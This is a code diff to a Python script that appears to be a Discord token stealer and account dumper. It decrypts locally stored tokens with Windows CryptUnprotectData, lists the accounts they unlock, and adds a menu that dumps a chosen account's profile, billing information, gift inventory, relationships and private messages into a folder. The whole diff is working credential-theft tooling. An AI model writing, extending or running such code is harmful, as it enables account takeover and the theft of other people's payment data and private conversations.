@@ -1,4 +1,4 @@
-import requests,json,os,colorama
+import requests,json,os,colorama,datetime
 from json import loads
 from os import getlogin, listdir
 from json import loads
@@ -9,6 +9,7 @@ from win32crypt import CryptUnprotectData
 from time import sleep
 from colorama import Fore, init
 from DiscordClass import Discord
+from dumps import *
 colorama.init()
 
 
@@ -69,6 +70,46 @@ def main():
             print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}{num}{Fore.WHITE}] {Account.get_username()}#{Account.get_discriminator()}")
         else:
             print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}{num}{Fore.WHITE}] Invalid Token Found!")
+
+    Account_Index = int(input(f"{Fore.WHITE}Select an account:{Fore.LIGHTBLUE_EX} "))
+
+    try:
+        os.mkdir(f"{Account.get_username()}_{datetime.date.today()}")
+    except:
+        print(f"{Fore.RED}Folder already exists")
+
+    os.system('cls')
+
+    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}1{Fore.WHITE}] Account Info")
+    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}2{Fore.WHITE}] Billing Info")
+    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}3{Fore.WHITE}] Gift Inventory")
+    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}4{Fore.WHITE}] Relationships")
+    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}5{Fore.WHITE}] Private Messages")
+    print(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}6{Fore.WHITE}] Full Dump")
+
+    
+    Option = int(input(f"{Fore.WHITE}Select an option:{Fore.LIGHTBLUE_EX} "))
+
+    if Option == 1:
+        AccountInfomation(Tokens[Account_Index])
+    elif Option == 2:
+        AccountBilling(Tokens[Account_Index])
+    elif Option == 3:
+        AccountGifts(Tokens[Account_Index])
+    elif Option == 4:
+        AccountRelationships(Tokens[Account_Index])
+    elif Option == 5:
+        AccountMessages(Tokens[Account_Index])
+    elif Option == 6:
+        AccountInfomation(Tokens[Account_Index])
+        AccountBilling(Tokens[Account_Index])
+        AccountGifts(Tokens[Account_Index])
+        AccountRelationships(Tokens[Account_Index])
+        AccountMessages(Tokens[Account_Index])
+    else:
+        print(f"{Fore.RED}Invalid Option")
+        sleep(3)
+        return
         
         
 
